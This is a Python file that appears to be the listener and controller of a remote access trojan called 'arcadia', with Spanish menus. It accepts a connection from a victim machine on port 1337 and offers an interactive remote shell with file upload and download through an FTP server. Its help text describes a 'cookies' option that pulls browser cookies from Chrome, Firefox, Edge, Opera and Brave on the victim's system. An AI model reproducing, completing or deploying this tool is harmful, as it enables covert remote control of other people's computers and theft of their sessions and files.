import socket,os,colorama, time

user = os.getlogin()

host = ""
port = 1337
ada = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ada.bind((host,port))

ada.listen(5)

def banner(contexto):
    os.system("clear")
    usuario = user
    one = "                               ______________         ".center(70)
    two = "______ ______________________ _______  /___(_)______ _".center(70)
    tree = "_  __ `/__  ___/_  ___/_  __ `/_  __  / __  / _  __ `/".center(70)
    four = "/ /_/ / _  /    / /__  / /_/ / / /_/ /  _  /  / /_/ / ".center(70)
    five = "\__,_/  /_/     \___/  \__,_/  \__,_/   /_/   \__,_/  ".center(70)
    six = "____________________________________________________".center(70)
    menu = f"   USUARIO: {usuario}    ESTADO: {contexto}".center(65)
    print(f"""
    {one}
    {two}
    {tree}
    {four}
    {five}
    {six}
    {menu}\n\n""")

def home():
    banner("ESPERANDO CLIENTES...")
    conex, addr = ada.accept()
    def hub():
        while True:
            banner("MENU")
            print("""
            1) Ayuda
            2) Shell
            3) Cookies""")

            def opciones():
                opcion = input("    : ")
                if opcion == 'volver':
                    hub()
                if opcion == 'salir':
                    conex.close()
                    print("la conexion se a cerrado correctamente!")
                    exit()
            lista = ["1", "2", "3", "salir"]
            opcion = input("\n\n    : ")

            if opcion in lista:
                pass
            else:
                print("     la opcion ingresada no existe")
                time.sleep(1)
                hub()
        
            if opcion == "1":
                banner("AYUDA")
                print("""    COOKIES: AL SELECCIONAR LA OPCION 'COOKIES' EL RAT BUSCARA CUALQ   UIERA DE LOS SIGUIENTES NAVEGADORES DENTRO DEL SISTEMA OPERATIVO VICTIMA(OPERA, CHROME, BR  AVE, OPERAGX, FIREFOX, FIREFOX-DEV Y  MICROSOFT EDGE), UNA VEZ QUE SE ENCUENTRE ALGUNO DE E STOS GUARDARA LAS COOKIES EN UN ARCHIVO LLAMADO 'navegador(victima)' DENTRO DEL SERVIDOR FTP    CORRESPONDIENTE A ESTA MISMA IP.

    SHELL: LA SHELL APARTE DE SU FUNCION OBVIA QUE ES INTERACTUAR CON LA SHELL DEL SISTEMA LE   AGREGUE LAS OPCIONES DE SUBIDA Y DESCARGA, PARA SUBIR UN ARCHIVO SE USA EL COMANDO 'subir no  mbre_archivo' y para descargar 'descargar nombre_archivo' cualquier archivo proveniente de la     maquina victima se guardara en el servidor ftp dentro de alguna carpeta nombrada segun el us    uario de la maquina victima. Para subir archivos debes asegurarte de que el archivo que quier   es subir este dentro del servidor ftp en la carpeta 'arcadia'.

    OPIONES: VOLVER Y SALIR.""")
                opciones()
            if opcion == "2":
                banner("SHELL")
                conex.send("shell".encode('utf-8'))
                while True:
                    comandos = input("      $ ")
                    if comandos == 'volver':
                        hub()
                    if comandos[:9] == 'descargar':
                        conex.send(comandos.encode('utf-8'))
                    if comandos[:5] == 'subir':
                        print("NOTA: asegurate de que el archivo este dentro del servidor ftp")
                        conex.send(comandos.encode('utf-8'))
                    if comandos == 'salir':
                        conex.close()
                        os.system("clear")
                        print("la conexion se ha cerrado exitosamente!")
                        exit()
                    conex.send(comandos.encode('utf-8'))
                    respuesta = conex.recv(1024)
                    print(respuesta.decode('utf-8'))
            if opcion == "3":
                banner("COOKIES")
                conex.send("cookies".encode('utf-8'))
                data = conex.recv(1024).decode('utf-8')
                while data:
                    print(f"    {data}")
                    break
                print("\n\n")
                opciones()

            if opcion == "salir":
                conex.close()
                os.system("clear")
                print("la conexion se ha cerrado correctamente!")
                exit()
    hub()

home()
